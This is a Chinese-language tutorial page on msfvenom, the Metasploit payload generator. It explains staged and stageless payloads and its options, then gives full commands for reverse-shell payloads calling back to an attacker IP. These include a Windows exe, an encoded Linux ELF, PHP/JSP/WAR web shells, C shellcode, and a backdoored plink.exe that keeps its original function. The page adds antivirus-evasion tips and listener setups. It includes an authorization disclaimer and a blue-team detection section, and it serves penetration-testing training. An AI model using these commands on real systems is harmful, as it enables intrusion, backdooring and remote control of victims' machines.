# msfvenom（Payload 生成器）

> **一句话**：把「指定一段反弹 Shell 代码，输出成你要的格式（exe/elf/php/apk/raw…）」这件事压缩成一条命令。
> **分类**：漏洞利用 ｜ **Kali 包**：`metasploit-framework`（**不是独立包**，随框架安装，命令 `msfvenom`）｜ **官方文档**：<https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>

---

## 1. 它解决什么问题

拿到命令执行/文件上传能力之后，需要一个能被目标执行的「载荷」。手工写 shellcode 并转成目标格式（PE/ELF/脚本）非常繁琐。`msfvenom` 是 `msfpayload` + `msfencode` 的合体，负责：

1. **选 Payload**（要做什么：反弹 Meterpreter / 简单 shell / 加用户）；
2. **定参数**（LHOST/LPORT）；
3. **选格式**（exe、elf、dll、php、jsp、war、apk、raw shellcode、C 数组…）；
4. **可选编码/加密**（规避坏字符与简单特征）。

对比同类：

| 工具 | 定位 |
|------|------|
| `msfvenom` | 通用 Payload **生成器**（不负责投递/管理会话） |
| `msfconsole` | Payload 的**消费方**（起监听、收会话） |
| `sliver` / `empire` | 自带生成 + C2 管理（新一代更隐蔽） |
| `donut` / `shellter` | 把 Payload 嵌进已有可执行文件/PE 注入 |

**关键认知**：`msfvenom` 只生成文件，**不会帮你起监听**。生成完必须用 `msfconsole` 的对应 handler 或 `nc -lvnp` 接。

---

## 2. 工作原理

```
msfvenom -p <payload> LHOST=.. LPORT=.. -f <format> -e <encoder> -i <n> -o out
         │                                            │
         │                                            └─ 编码管链：对 payload 反复编码，去掉坏字符
         └─ 从 modules/payloads/ 加载 payload 定义
                          │
                          ├─ 若为 staged（名字含 / 分隔，如 windows/x64/meterpreter/reverse_tcp）
                          │   → 输出的是「stub + 网络回连加载器」，体积小
                          └─ 若为 stageless（如 windows/x64/meterpreter_reverse_tcp）
                              → 输出「完整功能一次性打包」，体积大，无需二次回连
```

- **staged**：`windows/x64/meterpreter/reverse_tcp`（**有** `/meterpreter/` 分隔）——必须配 Metasploit handler 才能工作（二次拉取 stage）。
- **stageless**：`windows/x64/meterpreter_reverse_tcp`（**无**多余分隔）——自带全套，可以直接 `nc` 接（但 Meterpreter 协议仍需 msf handler）。
- 判断技巧：payload 名里 `meterpreter/reverse_tcp` 是分段，`meterpreter_reverse_tcp` 是单段。

---

## 3. 安装与快速上手

随 Metasploit 框架一起装：

```bash
sudo apt install metasploit-framework
command -v msfvenom
msfvenom --list payloads | head -20        # 列出可用 payload
```

```console
msfvenom --help | head -30
```

最经典的 Windows 反弹：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 \
         -f exe -o shell.exe
```

配套监听（另一个终端）：

```console
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.7
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > run -j            # 后台常驻，收多个会话
```

**要点**：handler 的 `payload`、`LHOST`、`LPORT` **必须与 msfvenom 生成时完全一致**，否则收不到会话。

---

## 4. 核心参数详解

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-p, --payload` | 指定 Payload | `msfvenom -l payloads` 查全量；优先 stageless 减少依赖 |
| `-f, --format` | 输出格式 | `exe` `elf` `dll` `macho` `php` `jsp` `war` `asp` `aspx` `python` `bash` `raw` `c` `hex` `base64` `apk` `msi` `psh` |
| `-o, --out` | 输出文件 | 不写则输出到 stdout（二进制写终端会乱码，**务必用 `-o`**） |
| `-e, --encoder` | 编码器 | `msfvenom -l encoders`；坏字符场景才需要 |
| `-i, --iterations` | 编码次数 | 一般 3–5；次数多体积暴涨且杀软更易命中 |
| `-b, --bad-chars` | 指定坏字符 | 如 `-b '\x00\x0a\x0d'`（缓冲区溢出时必用） |
| `-n, --nopsled` | 前置 NOP 长度 | 配合 `-b` 做跳板 |
| `-a, --arch` | 架构 | `x86` / `x64`；与目标对齐（32 位系统别用 x64） |
| `--platform` | 平台 | `windows` / `linux` / `osx` / `android` / `php`… |
| `-s, --space` | 限制最大长度 | 溢出处空间受限时用（如 `-s 2000`） |
| `-x, --template` | 使用模板文件 | 把 Payload 塞进合法程序（如 `-x putty.exe`） |
| `-k, --keep` | 保留模板原有功能 | 与 `-x` 配合，让原程序仍能运行（隐蔽） |
| `LHOST=` / `LPORT=` | 回连地址/端口 | 必须是被控机**可达**的地址，HTB 用 `tun0` 的 IP |
| `-v, --var-name` | 自定义变量名 | 输出 C/Python 时改变量名 |
| `--encrypt` | 加密（配合 `--encrypt-key`） | `aes256` 等，需 Metasploit `encrypted_payload` 支持 |
| `--iterations` + `--smallest` | 最小体积 | 抗沙箱/内存受限场景 |
| `-l, --list` | 列表 | `--list payloads` / `encoders` / `formats` / `all` |
| `--list-options` | 列出 payload 可配选项 | 有些 Payload 有 `EXITFUNC`、`PrependMigrate` 等 |

---

## 5. 实战演练

> **环境声明**：以下仅在**授权测试**或**自建靶机**（Metasploitable 2/3、Windows 测评虚拟机、TryHackMe/HTB 靶机）上执行。下面用「攻击机 10.10.14.7 / 靶机 10.10.14.20」示意，实际请替换为你的环境。**禁止用于未授权主机。**

### 场景 1：Windows 可执行文件反弹（最基础）

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.14.7 LPORT=4444 \
         -f exe -o /var/www/html/update.exe
```

```console
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/update.exe
```

**解读**：`Payload size: 510 bytes` 说明这是 **staged**（只有 stub）；`Final size` 是最终文件大小。把文件投递到靶机执行（模拟钓鱼附件场景），回到 handler：

```console
[*] Sending stage (201798 bytes) to 10.10.14.20
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.14.20:49712)
```

`Sending stage` 正是 staged Payload 二次回连的证据。

### 场景 2：Linux ELF + 坏字符编码（缓冲区溢出/受限场景）

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=10.10.14.7 LPORT=4444 \
         -b '\x00\x0a\x0d' -e x64/xor_dynamic -i 3 \
         -f elf -o /tmp/rev
chmod +x /tmp/rev
```

```console
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x64/xor_dynamic
x64/xor_dynamic succeeded with size 92 (iteration=1)
x64/xor_dynamic succeeded with size 100 (iteration=2)
x64/xor_dynamic succeeded with size 108 (iteration=3)
Final size of elf file: 240 bytes
Saved as: /tmp/rev
```

**解读**：`succeeded with size N` 逐次变大，说明每编码一次体积增加；`-b` 已确保结果里不含 `\x00`/`\x0a`/`\x0d`。用 `xxd /tmp/rev | head` 可验证坏字符是否真的消失。

```bash
nc -lvnp 4444        # 简单 shell 用裸 nc 就能接
```

### 场景 3：Web 场景的伪装 Payload 与格式选择

```bash
# PHP（Web 上传点 → 直接执行）
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f raw -o shell.php

# JSP（Tomcat）
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f raw -o shell.jsp

# WAR（Tomcat 上传部署）
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f war -o shell.war

# raw shellcode → C 数组（自定义载荷/漏洞利用嵌入）
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 \
         -f c -v buf > shellcode.c

# 嵌入合法模板并保留原功能
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 \
         -x /usr/share/windows-resources/binaries/plink.exe -k -f exe -o plink_backdoor.exe
```

**解读**：`-f raw` 用于「直接把脚本内容塞进上传的文件」；`-f war` 生成可部署的 Java Web 归档；`-f c -v buf` 得到 `unsigned char buf[] = "..."`，可直接粘进 C 漏洞利用程序。

配合 handler 批量收会话：

```console
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.7
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > run -j
```

---

## 6. 输出解读

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `Payload size: N bytes` | 原始 Payload 大小 | 过大说明 staged 之外的附加内容多，考虑 `--smallest` |
| `Found 1 compatible encoders` | 找到可用编码器 | 不同架构用不同编码器，`-l encoders` 可查 |
| `succeeded with size N` | 每轮编码结果 | 体积增长可接受就行 |
| `Final size of exe file: N bytes` | 输出文件大小 | 与模板有关 |
| `No platform was selected...` | 自动推断平台/架构（提示非错误） | 可忽略，或显式 `-a`/`--platform` |
| `Error: The following options were not set: LHOST` | 必填项缺失 | 补 `LHOST=`/`LPORT=` |
| handler 无 `Sending stage` | Payload 与 handler 配置不一致 / 出站被拦 | 逐项核对 payload 名、IP、端口 |

---

## 7. 与其他工具配合

```
msfvenom 生成 payload ──► 投递（钓鱼/上传/命令执行）
        │                        │
        │                        └─► msfconsole multi/handler 收会话
        ├─► -f raw/exe + 加壳工具（upx）减小体积
        ├─► -f c ──► 嵌入自写漏洞利用程序（配合 searchsploit 找到的 PoC）
        ├─► Metasploit evasion 模块 ──► 免杀（授权环境）
        └─► 生成的会话 ──► Metasploit 后渗透 / Sliver 作为替代 C2
```

- Payload 种类与后台用法见 [`metasploit-framework.md`](metasploit-framework.md)。
- 找不到现成模块时，用 [`searchsploit.md`](searchsploit.md) 找 PoC，把 `-f c` 输出的 shellcode 嵌进去。
- 更现代的 C2（自动生成 implant + 隐蔽信道）见 [`../12-基础设施与C2/sliver.md`](../12-基础设施与C2/sliver.md)。

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `No session was created` | handler 的 payload 与生成时不一致（最常见的坑） | 两边 `payload` / `LHOST` / `LPORT` **逐字**对齐 |
| 生成的文件在 Windows 上被秒删 | Defender 特征库已收录默认 msfvenom 模板 | 授权环境下用 evasion 模块/编码/自定义 Loader；不要用于生产 |
| `Error: The value of LHOST is invalid` | 写了域名或不可达地址 | 用被控机可达的 IP：`ip a` 查 `tun0`/`eth1` |
| 生成的 exe 一运行就退出 | 缺 `EXITFUNC` 或目标位数不匹配 | `set EXITFUNC thread`；确认 32/64 位 |
| `-e` 报 `No encoder found` | 架构与编码器不匹配（如 x64 用 x86 编码器） | `msfvenom -l encoders` 按架构筛选 |
| 编码很多次后杀软更容易拦 | 高频编码是典型恶意特征 | `-i` 用 1–3 次即可；现代免杀靠 Loader 而非编码 |
| 输出到终端出现乱码 | 二进制打到 stdout | 必须用 `-o file` |
| `-x` 模板报 `Invalid template` | 模板格式/位数不符 | 用同架构、同格式（PE 对 PE）的合法文件 |
| 生成的 `war` 部署后 404 | Tomcat 需重启/自动解压延迟 | 检查 `manager` 部署日志；路径用 `/shell/` 之类 |
| `msfvenom: command not found` | 只装了部分组件 | `sudo apt install metasploit-framework`（msfvenom 随框架提供） |

---

## 9. 防御视角（蓝队）

| 信号 | 检测方式 | 缓解 |
|------|----------|------|
| 默认 msfvenom PE 特征 | YARA 规则（如 `kiwi_passwords.yar` 同思路）、AV 特征库 | 补丁 + EDR + 应用白名单（WDAC/AppLocker） |
| `Sending stage` 网络流量 | 内网主机到非常规端口的**出站**长连接、Meterpreter 心跳特征 | 出站白名单、TLS 检查、网络分段 |
| 进程注入行为 | `CreateRemoteThread`/`QueueUserAPC`、跨进程内存写入 | Credential Guard、EDR 行为规则、LSASS PPL |
| 编码器高频特征 | 静态熵值高 + 无签名 PE 落地 | 落地文件哈希黑名单、邮件附件沙箱 |
| 脚本类 Web Shell（php/jsp/war） | Web 目录新增可执行脚本、异常子进程（`w3wp.exe` → `cmd.exe`） | 上传目录禁止执行（`php_admin_flag engine off`）、文件完整性监控 |
| 模板劫持（`-x` 合法程序） | 合法程序哈希变化、签名校验失败 | 代码签名强制校验、软件白名单 |

`msfvenom` 的默认输出在**现代 EDR + 最新补丁**面前存活率很低，但正因如此它非常适合**授权测试中验证检测能力**。

---

## 10. 参考

- Metasploit 官方文档 · How to use msfvenom：<https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>
- Payload 类型参考（staged/stageless）：<https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html>
- Kali 工具页：<https://www.kali.org/tools/metasploit-framework/>
- `msfvenom --help`、`msfvenom -l payloads`、`msfvenom -l encoders`

## ⚠️ 法律与伦理

生成、投放恶意载荷对未授权系统使用，可能触犯《刑法》第 285/286 条（非法侵入、非法控制、破坏计算机信息系统罪）及《网络安全法》。本章节仅用于**授权渗透测试、CTF、自建靶场与防御能力验证**。生成物请妥善保管，避免外泄误用。
